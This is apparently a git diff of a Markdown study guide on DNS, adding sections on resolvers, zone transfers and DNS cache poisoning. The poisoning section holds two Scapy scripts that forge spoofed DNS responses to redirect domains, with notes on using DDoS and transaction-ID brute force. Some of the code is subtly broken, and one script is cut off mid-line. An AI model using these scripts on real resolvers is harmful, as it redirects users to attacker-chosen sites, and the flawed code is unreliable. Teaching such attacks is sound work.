@@ -14,7 +14,21 @@
 > - last but least we will learn why DNS is a potential attack vector, how snooping works and what DNS-poisining is
 
 ---
+## DNS Resolver
 
+A **DNS resolver** is a crucial component in the domain name system. Its primary function is to **accept queries from clients** (such as your browser) and perform **recursive queries** to locate IP addresses. Here’s how it works:
+
+1.  When you type a domain name (e.g., `example.com`) into your browser, the DNS resolver on your machine receives this request.
+2.  The resolver then **contacts other DNS servers** to find the IP address associated with the domain name.
+3.  It follows a chain of delegations, starting from the **root nameservers**, down to the **top-level domain (TLD) nameservers**, and finally to the authoritative nameservers for the specific domain.
+4.  Once it reaches the authoritative nameserver, it retrieves the IP address and returns it to your browser.
+
+## DNS Server
+
+Now, let’s talk about **DNS servers** in general. The term “DNS server” is broader and encompasses various types of servers involved in the DNS system. Here are the key distinctions:
+
+1.  **Authoritative Nameserver**: This type of DNS server holds complete data for one or more **zones** (domains). For example, the `.com` domain has authoritative nameservers that store information about all its subdomains.
+2.  **Recursive Nameserver**: A recursive DNS server starts with no data and performs queries on behalf of clients. It follows delegations and CNAME records until it finds the answer for the client query. You might use a local recursive nameserver (on your machine or provided by your ISP) or a remote one like Google Public DNS or Cloudflare DNS.
 ## Records
 
  DNS records are essential for defining how domain names are translated into IP addresses. 
@@ -126,23 +140,26 @@ When changes are made to the zone files, they are synchronized via the zone tran
 
 ```mermaid
 sequenceDiagram
-    participant Client 
-    participant SourceDNS 
-    participant TargetDNS 
-    participant QueryZoneFile 
-    participant SendResponse 
-    participant CheckPermissions 
-    participant TransferZoneData 
-    participant DenyZoneTransfer 
 
-    Client ->> SourceDNS: Client request
-    SourceDNS ->> QueryZoneFile: Query zone file
-    QueryZoneFile ->> SendResponse: Send response
-    Client ->> TargetDNS: Zone transfer request
-    TargetDNS ->> CheckPermissions: Check permissions
-    CheckPermissions ->> TransferZoneData: Permissions granted
-    CheckPermissions ->> DenyZoneTransfer: Permissions denied
-    TransferZoneData ->> TargetDNS: Transfer zone data
+    participant Client as Client Request
+    participant DNSMaster as Source DNS Server (Primary)
+    participant DNSSlave as Target DNS Server (Secondary)
+    participant ZoneFile as Zone File
+
+
+    Client->>DNSMaster: Send Zone Transfer Request
+    DNSMaster->>Client: Acknowledge Request
+    DNSMaster->>DNSSlave: Initiate Zone Transfer
+    DNSSlave->>DNSMaster: Confirm Ready to Receive
+    DNSMaster->>ZoneFile: Read Zone Data
+    ZoneFile-->>DNSMaster: Return Zone Data
+    DNSMaster->>DNSSlave: Send Zone Data
+    DNSSlave->>DNSMaster: Acknowledge Receipt of Zone Data
+    DNSSlave->>ZoneFile: Write Zone Data
+    ZoneFile-->>DNSSlave: Confirmation of Successful Write
+    DNSSlave->>DNSMaster: Notify Completion of Zone Transfer
+    DNSMaster->>Client: Notify Completion of Zone Transfer
+
 
 ```
 
@@ -508,47 +525,31 @@ dig +norecurse @192.168.122.7 foreman.de
 > now we know that `localhost` made a DNS-request for `foreman.de`
 
 ---
+
+
+> -   We construct a DNS query packet targeting `www.example.com`.
+> -   We then create a DNS response packet that includes our spoofed source IP (`src_ip`) and the actual destination IP (`dst_ip`). The response packet is crafted to mimic a legitimate DNS response for `www.example.com`, directing it to an IP address (`1.3.3.7`) of the attacker's choice.
+> -   Finally, we send the crafted DNS response packet towards the DNS server.
+
+---
+
 ## DNS Cache-Poisining
  DNS cache poisoning, is a malicious activity where an attacker injects false DNS records into a DNS server's cache. 
 > - This manipulation tricks the DNS server into returning incorrect IP addresses for a domain name, redirecting users to malicious websites instead of legitimate ones.
 
 - Attackers often target DNS servers that are not properly secured or configured, leading to successful redirection of traffic.
+- there are 2 main tatics used:
+> 
+>     - a ***denial of service attack*** such as DDOS can generate latency, or kill the spoofed server in order to take it over 
+>     -  
 
-***DNS Spoofing***
-DNS spoofing exploits vulnerabilities in the DNS protocol to trick a DNS server into associating a domain name with an incorrect IP address.
- 
 
 
-```mermaid
-sequenceDiagram
-    participant Attacker as Attacker
-    participant NSXX as Controlled DNS Server XX
-    participant PublicNSYY as Public DNS Server YY
-    participant User as User
-
-    Attacker->>NSXX: Takes control of DNS Server XX
-    Note over Attacker,NSXX: Manipulates DNS Server XX
-
-    User->>PublicNSYY: Requests resolution for test.example.com
-    PublicNSYY->>NSXX: Queries DNS Server XX for test.example.com
-    Note over PublicNSYY,NSXX: DNS Server XX responds with manipulated record
-
-    NSXX-->>PublicNSYY: Returns correct IP for test.example.com + fake record for de.wikipedia.org (192.0.2.1)
-    PublicNSYY-->>User: Caches the fake record for de.wikipedia.org (192.0.2.1)
-
-    Note over PublicNSYY: Later, User requests de.wikipedia.org
-
-    User->>PublicNSYY: Requests resolution for de.wikipedia.org
-    PublicNSYY-->>User: Returns cached fake IP (192.0.2.1) for de.wikipedia.org
-
-    Note over User: User tries to access de.wikipedia.org but is redirected to a different site
-```
-
-***IP Spoofing***
-IP spoofing in the context of DNS spoofing involves forging the sender's IP address in the packet header to make it appear as if the packet comes from a trusted source, such as a legitimate DNS server. 
-This technique allows an attacker to bypass certain security mechanisms that rely on verifying the origin of the traffic.
+***Sending a fake record using spoofed ip***
+- attack an additional nameserver in order to respond to the targeted nameserver with a correct ip, but also with a ***fake record***
+   -  a ***denial of service attack*** such as DDOS can be used to kill the additional nameserver to spoof it
+   - server got taken over by any other hack and gets controlled directly
 ```Python
-pip install scapy
 from scapy.all import *
 
 # Define the destination IP (the victim's DNS server)
@@ -557,21 +558,92 @@ dst_ip = "8.8.8.8"  # Google's DNS server as an example
 # Define the source IP (the attacker's IP, spoofed)
 src_ip = "192.168.1.100"
 
-# Create a DNS query packet
-query_packet = IP(dst=dst_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="www.example.com"))
+# Create a DNS query packet for test.example.com
+query_packet_test = IP(dst=dst_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="test.example.com"))
 
-# Create a DNS response packet with a spoofed IP address
-response_packet = IP(src=src_ip, dst=dst_ip)/UDP(sport=12345, dport=53)/DNS(id=query_packet[DNS].id, aa=True, qr=True, rcode=0, an=DNSRR(rrname="www.example.com", ttl=10, rdata="192.0.2.1"))
+# Create a DNS response packet for test.example.com with a spoofed IP address
+response_packet_test = IP(src=src_ip, dst=dst_ip)/UDP(sport=12345, dport=53)/DNS(id=query_packet_test[DNS].id, aa=True, qr=True, rcode=0, an=DNSRR(rrname="test.example.com", ttl=10, rdata="correct.ip.for.test.example.com"))
 
-# Send the DNS response packet
-send(response_packet)
+# Create a DNS query packet for de.wikipedia.org
+query_packet_wiki = IP(dst=dst_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="de.wikipedia.org"))
 
-print("Sent DNS response packet.")
+# Create a DNS response packet for de.wikipedia.org with a spoofed IP address
+response_packet_wiki = IP(src=src_ip, dst=dst_ip)/UDP(sport=12345, dport=53)/DNS(id=query_packet_wiki[DNS].id, aa=True, qr=True, rcode=0, an=DNSRR(rrname="de.wikipedia.org", ttl=10, rdata="192.0.2.1"))
+
+# Send the DNS response packets
+send(response_packet_test)
+send(response_packet_wiki)
+
+print("Sent DNS response packets.")
+
 ```
-> -   We construct a DNS query packet targeting `www.example.com`.
-> -   We then create a DNS response packet that includes our spoofed source IP (`src_ip`) and the actual destination IP (`dst_ip`). The response packet is crafted to mimic a legitimate DNS response for `www.example.com`, directing it to an IP address (`192.0.2.1`) of the attacker's choice.
-> -   Finally, we send the crafted DNS response packet towards the DNS server.
 
+***Sending a fake query by using IP-Spoofing***
+- we will attack the victim directly instead of using an additional nameserver
+ - a ***denial of service attack*** such as DDOS could be used to kill the corresponding DNS 
+- the spoofed DNS sends a `fake query` directly to the victim 
+-  the attcker will either:
+   - sniff the web to get the Transaction-Number
+   - use random Transaction-Number in brute-force-manier
+ 
+
+```mermaid
+sequenceDiagram
+    participant Attacker as Attacker (192.168.1.100)
+    participant Victim as Victim Client (192.168.122.7)
+    Attacker->>Victim: Generates a random transaction ID
+    Attacker->>Victim: Creates a fake DNS query for foreman.de
+    Attacker->>Victim: Sends the fake DNS query
+    Note over Attacker,Victim: Victim receives the fake DNS query
+    Attacker->>Victim: Creates a fake DNS response for foreman.de pointing to 1.3.3.7
+    Attacker->>Victim: Sends the fake DNS response
+    Note over Attacker,Victim: Victim caches the fake DNS response
+    Attacker->>Victim: Later, Victim requests foreman.de
+    Attacker->>Victim: Returns the cached fake DNS response (1.3.3.7)
+    Note over Victim: Victim tries to access foreman.de but is redirected to a different site
+
+```
+
+```python
+from scapy.all import send, IP, UDP, DNS, DNSQR, DNSRR
+import random
+
+# Target domain to be spoofed
+target_domain = "foreman.de"
+
+# IP address of the machine running the python code
+attacker_ip = "192.168.1.100"  # Modify this according to your environment
+
+# IP address of the victim client (DNS resolver)
+victim_ip = "192.168.122.7"  # Modify this according to your environment
+
+# DNS port
+dns_port = 53
+
+# Generate a random transaction ID
+transaction_id = random.randint(0, 65535)
+
+# Generate a fake DNS query
+def generate_fake_dns_query(transaction_id):
+    query = DNSQR(qname=target_domain, id=transaction_id)
+    return query
+
+# Spoof the DNS request and response
+def spoof_dns_request_and_answer(transaction_id):
+    # Create the DNS request with the specified transaction ID
+    query_packet = IP(src=attacker_ip, dst=victim_ip) / UDP(sport=random.randint(1024, 65535), dport=dns_port) / DNS(id=transaction_id, rd=1, qd=DNSQR(qname=target_domain))
+    
+    # Create the fake DNS response
+    answer = IP(dst=victim_ip, src=attacker_ip) / UDP(dport=dns_port, sport=random.randint(1024, 65535)) / DNS(id=transaction_id, aa=True, qr=True, an=DNSRR(name=target_domain, type='A', ttl=10, rdata='1.3.3.7'))
+    
+    # Send the fake DNS response
+    send(answer)
+
+# Start the DNS spoofing attack
+spoof_dns_request_and_answer(transaction_id)
+
+print(f"DNS spoofing
+```
 
 
 
